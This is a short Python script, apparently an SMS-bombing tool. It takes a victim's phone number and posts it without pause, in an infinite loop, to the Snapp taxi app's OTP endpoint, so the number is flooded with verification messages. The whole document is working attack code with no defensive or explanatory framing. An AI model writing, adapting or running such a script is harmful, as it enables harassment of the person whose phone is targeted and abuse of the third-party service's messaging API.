import requests
from termcolor import colored
import time

phonen = input('phone number: ')
url2 = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'

pnd = {'cellphon': f'{phonen}'}

while True:
      req2 = requests.post(url2, json=pnd)
      
      print(colored('yes', 'red'))
